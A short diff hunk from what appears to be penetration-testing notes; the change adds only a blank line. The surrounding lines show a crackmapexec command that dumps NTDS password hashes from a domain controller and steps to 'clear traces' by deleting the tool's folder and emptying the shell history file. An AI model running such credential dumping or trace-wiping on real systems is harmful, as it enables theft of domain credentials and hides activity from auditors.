@@ -12,6 +12,7 @@ crackmapexec smb DC_IP_Address -u user -p 'pass' --ntds
 # Steps used to clear traces on Kali 
 
 Rem -r ~/.cme
+
 cat /dev/null > ~/.zsh_history
 
 
